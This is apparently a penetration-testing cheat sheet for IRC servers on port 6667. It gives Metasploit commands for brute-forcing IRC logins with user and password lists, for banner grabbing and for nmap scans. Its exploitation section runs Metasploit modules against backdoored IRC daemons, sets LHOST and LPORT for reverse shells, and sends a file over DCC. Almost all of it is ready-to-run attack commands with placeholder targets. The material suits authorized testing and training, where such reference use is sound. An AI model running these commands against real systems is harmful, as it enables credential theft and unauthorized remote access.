# IRC

## Enumeration

### Metasploit

##### irc_brute
```bash
use auxiliary/scanner/irc/irc_brute
set RHOSTS [IP]
set RPORT 6667
set USER_FILE [user file]
set PASS_FILE [password file]
run
```

##### irc_away
```bash
use auxiliary/scanner/irc/irc_away
set RHOSTS [IP]
set RPORT 6667
run
```

##### irc_banner
```bash
use auxiliary/scanner/irc/irc_banner
set RHOSTS [IP]
set RPORT 6667
run
```

### Nmap

##### nmap Version Detection
```bash
nmap -p 6667 -sV [IP]
```

##### nmap Banner Grabbing
```bash
nmap -p 6667 --script=irc-banner [IP]
```

### IRC Client

##### irc
```bash
irc [IP] 6667
```

##### irc (Join Channel)
```bash
/join [channel]
```

##### irc (Send Message to Channel)
```bash
/msg [channel] [message]
```


---
---


## Exploitation

### Metasploit

##### unreal_ircd_3281_backdoor
```bash
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOST [IP]
```

##### irc_dcc
```bash
use exploit/unix/irc/irc_dcc
set RHOSTS [IP]
set RPORT 6667
set LHOST [local IP]
set LPORT [local port]
run
```

##### irc_backdoor
```bash
use exploit/unix/irc/irc_backdoor
set RHOSTS [IP]
set RPORT 6667
set LHOST [local IP]
set LPORT [local port]
run
```

### Nmap

##### nmap (IRC DCC Backdoor Check)
```bash
nmap --script=irc-dcc [IP] -p 6667
```

##### nmap (IRC Backdoor Detection)
```bash
nmap --script=irc-backdoor [IP] -p 6667
```

### IRC Client

##### Send Exploit (DCC)
```bash
/dcc send [IP] [FILE_NAME] [/FILE/LOCATION/FILE]
```
